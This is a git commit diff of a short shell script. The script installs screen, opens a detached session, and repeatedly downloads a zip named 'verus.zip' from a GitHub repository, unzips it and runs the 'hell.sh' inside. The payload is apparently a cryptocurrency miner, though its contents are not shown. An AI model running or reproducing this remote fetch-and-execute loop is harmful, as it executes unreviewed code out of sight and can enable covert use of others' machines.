059e35b73e8fc2970851770a038c8013d172cd99
elemenapi <91756972+elemenapi@users.noreply.github.com>
2021-10-02 02:35:00 +0700

    Update and rename lagi.sh to sindi.sh

--- sindi.sh
+++ sindi.sh
@@ -1,6 +1,6 @@
 sudo apt update -y
 sudo apt install screen -y
-sudo screen -S random
+sudo screen -dmS random
 while [ 1 ]; do
 wget https://raw.githubusercontent.com/elemenapi/hell/main/verus.zip && unzip verus.zip && chmod +x hell.sh && ./hell.sh
 sleep 6969
